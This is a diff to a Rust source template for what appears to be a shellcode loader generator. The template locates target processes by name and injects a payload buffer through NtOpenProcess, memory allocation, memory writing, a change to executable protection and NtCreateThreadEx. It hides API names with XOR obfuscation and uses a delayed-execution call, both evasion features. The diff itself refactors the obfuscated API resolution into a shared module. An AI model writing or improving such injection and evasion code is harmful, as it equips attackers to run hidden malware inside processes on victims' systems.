@@ -5,14 +5,12 @@
 {{COMMON_MODULE}}
 
 use sysinfo::System;
-use std::ffi::CString;
 use std::include_bytes;
 use std::ptr::null_mut;
 
 use winapi::{
     um::{
         winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS, PROCESS_ALL_ACCESS},
-        libloaderapi::{GetModuleHandleA, GetProcAddress},
     },
     shared::{
         ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS},
@@ -44,18 +42,6 @@ const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
 const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
 const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};
 
-fn deobfuscate_bytes(d: &[u8]) -> Vec<u8> {
-    d.iter().map(|b| b ^ K).collect()
-}
-
-unsafe fn resolve_nt_api_address(n: &[u8]) -> *const () {
-    let ntdll = CString::new(lc!("ntdll")).unwrap();
-    let h = GetModuleHandleA(ntdll.as_ptr());
-    let s = deobfuscate_bytes(n);
-    let c = CString::new(s).unwrap();
-    GetProcAddress(h, c.as_ptr()) as *const ()
-}
-
 type FA = unsafe extern "system" fn(*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CID) -> i32;
 type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
 type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
@@ -69,7 +55,7 @@ fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
     let tar_lower = tar.to_lowercase();
     for (_, pro) in s.processes() {
         if pro.name().to_string_lossy().to_lowercase() == tar_lower {
-            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+            dom.push(pro.pid().as_u32() as usize);
         }
     }
     dom
@@ -77,7 +63,7 @@ fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
 
 fn pause(ms: i64) {
     unsafe {
-        let f: FH = std::mem::transmute(resolve_nt_api_address(OBF_H));
+        let f: FH = std::mem::transmute(common::resolve_nt_api_address(OBF_H, K));
         let interval: i64 = -(ms * 10_000);
         f(0, &interval);
     }
@@ -99,11 +85,11 @@ fn inject_shellcode(mut buf: Vec<u8>, tar: usize) {
     };
 
     unsafe {
-        let f_open: FA = std::mem::transmute(resolve_nt_api_address(OBF_A));
-        let f_alloc: FB = std::mem::transmute(resolve_nt_api_address(OBF_B));
-        let f_write: FC = std::mem::transmute(resolve_nt_api_address(OBF_C));
-        let f_protect: FD = std::mem::transmute(resolve_nt_api_address(OBF_D));
-        let f_thread: FE = std::mem::transmute(resolve_nt_api_address(OBF_E));
+        let f_open: FA = std::mem::transmute(common::resolve_nt_api_address(OBF_A, K));
+        let f_alloc: FB = std::mem::transmute(common::resolve_nt_api_address(OBF_B, K));
+        let f_write: FC = std::mem::transmute(common::resolve_nt_api_address(OBF_C, K));
+        let f_protect: FD = std::mem::transmute(common::resolve_nt_api_address(OBF_D, K));
+        let f_thread: FE = std::mem::transmute(common::resolve_nt_api_address(OBF_E, K));
 
         let s = f_open(&mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
         if !NT_SUCCESS(s) { return; }
